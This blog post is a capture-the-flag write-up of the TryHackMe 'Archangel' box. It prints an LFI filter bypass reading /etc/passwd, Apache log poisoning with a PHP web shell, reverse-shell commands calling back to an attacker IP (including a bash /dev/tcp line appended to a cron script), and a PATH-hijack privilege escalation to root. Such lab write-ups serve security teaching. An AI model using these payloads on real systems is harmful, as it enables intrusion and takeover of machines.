---
layout: post
title:  "THM: Archangel"
date:   2021-02-04 23:00:00 +1100
category: hacking
---

## Archangel
*A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.*

This is [Archangel](https://tryhackme.com/room/archangel) from THM. It's easy rated, but I would say it's not the easiest easy. This writeup is a bit half-hearted, but it captures the important points.

## Ports
SSH and HTTP; that's it. 

## HTTP
It's a basic website but we have a clue about getting another hostname. We see an email address with the domain *mafialive.thm*. We add this to /etc/hosts and go to http://mafialive.thm. Here is a different page, with a flag. In robots.txt we find what we we are after - *test.php*.

We are given an LFI, and we have to find how to exploit it.

### LFI
We can use base64 encoding to get the source code for *test.php*.

{% highlight php %}
<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: REDACTED

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>
</html>
{% endhighlight %}

So, what do we have? The *containsStr* function basically says we cannot have *../..* in whatever path we give to the function, but it must contain 
*/var/www/html/development_testing*. This complicates our LFI somewhat.

Initially I tried paths like:

>/etc/passwd%00/var/www/html/development_testing

This did not produce any errors, but also did not create the desired result, so null bytes do not work.

How do we get from /var/www/html/development_testing to some other directory? We have to retreat back down the directory tree from there. A working path is:

http://mafialive.thm/test.php?view=/var/www/html/development_testing..///////..////..///////..////..///////..////..///////..////..///////..////..///////..////..///////..////..///////..////..///////..////..///////..////etc/passwd

This was easily the trickiest part I think, although it's quite simple conceptually.

### Log poisoning
With our LFI now working, we can include */var/log/apache2/access.log* and this is our path onto the box. We can poison the log like so:

{% highlight shell %}
root@kali:/opt/tryhackme/archangel# nc mafialive.thm 80
GET /<?php system($_GET['cmd']);?>
HTTP/1.1 400 Bad Request
Date: Thu, 04 Feb 2021 10:41:04 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
</body></html>
{% endhighlight %}

Then we can send a shell command and get on the box; like:

``
php+-r+'$sock%3dfsockopen("10.9.10.123",1234)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'
``

## Lateral Move
As www-data we need to exploit a cronjob running as *archangel* to become that user. I'll just show the command I used (with a second listener), without showing crontab:

{% highlight shell %}
www-data@ubuntu:/opt$ printf 'bash -i >& /dev/tcp/10.9.10.123/1235 0>&1\n' >> helloworld.sh
< /dev/tcp/10.9.10.123/1235 0>&1\n' >> helloworld.sh
{% endhighlight %}

## Privesc
As *archangel* we've got access to an SUID binary that calls *cp* without a path - this is our privesc. I create an evil *cp* and call the binary. I didn't disassemble the binary; strings was enough to see what was going on.

{% highlight shell %}
archangel@ubuntu:~/secret$ printf '/bin/sh\n' > cp
printf '/bin/sh\n' > cp
archangel@ubuntu:~/secret$ chmod +x cp
chmod +x cp
archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
archangel@ubuntu:~/secret$ ./backup
./backup
id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
{% endhighlight %}

A few good things for an easy rated box I reckon.
